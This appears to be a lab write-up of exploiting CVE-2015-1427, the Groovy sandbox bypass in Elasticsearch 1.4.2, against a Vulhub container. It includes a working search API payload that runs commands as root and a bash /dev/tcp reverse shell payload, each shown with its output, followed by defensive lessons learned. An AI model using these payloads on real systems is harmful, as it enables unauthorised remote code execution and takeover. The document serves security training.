# Task 9 - Independent Exploitation: Elasticsearch CVE-2015-1427

## Selected Target

Elasticsearch 1.4.2 - Groovy Sandbox Bypass / Remote Code Execution (CVE-2015-1427)

Deployed via Vulhub: `vulhub/elasticsearch/CVE-2015-1427`

## Identified Software Version

- Service: Elasticsearch REST API
- Version: 1.4.2
- Lucene: 4.10.2
- Port: 9200/tcp

## Vulnerability Information

- CVE: CVE-2015-1427
- Type: Remote Code Execution (pre-auth)
- Affected versions: Elasticsearch < 1.3.8 and < 1.4.3
- Component: Groovy dynamic scripting engine (enabled by default)

Elasticsearch enabled dynamic Groovy scripting by default. The sandbox introduced after CVE-2014-3120 was insufficient. An attacker can send crafted JSON to the search API with an embedded Groovy script. The script invokes Java reflection to bypass sandbox restrictions and execute arbitrary OS commands.

The key bypass uses:
`java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("cmd").getText()`

## Exploitation Methodology

1. Confirmed Elasticsearch 1.4.2 running on port 9200 via nmap
2. Searched ExploitDB - found exploits 36337.py and 36415.rb (CVE-2015-1427)
3. Added a document to the index (required for script_fields to execute)
4. Sent POST to /_search with Groovy payload in script_fields
5. Confirmed RCE - `id` returned `uid=0(root)`
6. Created proof file `/tmp/orion_elastic_hacked` on target
7. Obtained interactive reverse shell via Groovy array execute syntax

## Proof of Command Execution

```
POST /_search?pretty
{"size":1,"script_fields":{"lupin":{"lang":"groovy","script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}

Response:
"lupin" : [ "uid=0(root) gid=0(root) groups=0(root)\n" ]
```

## Proof of Shell Access

```
Groovy payload: ["/bin/bash","-c","bash -i >& /dev/tcp/172.22.0.3/5557 0>&1"].execute()

nc listener received:
connect from [::ffff:172.22.0.2]:35242
root@5cea7beadeb5:/usr/share/elasticsearch# whoami; id; hostname; pwd
root
uid=0(root) gid=0(root) groups=0(root)
5cea7beadeb5
/usr/share/elasticsearch
```

## Lessons Learned

- publicly exposed search APIs with dynamic scripting enabled are high-risk
- sandbox implementations can be bypassed via reflection even when direct method calls are blocked
- unauthenticated pre-auth RCE on a search service running as root is worst case
- same methodology applies: recon -> version -> CVE research -> exploit -> shell
- Metasploit module for this CVE exists but failed on ARM emulation; manual curl exploit worked fine
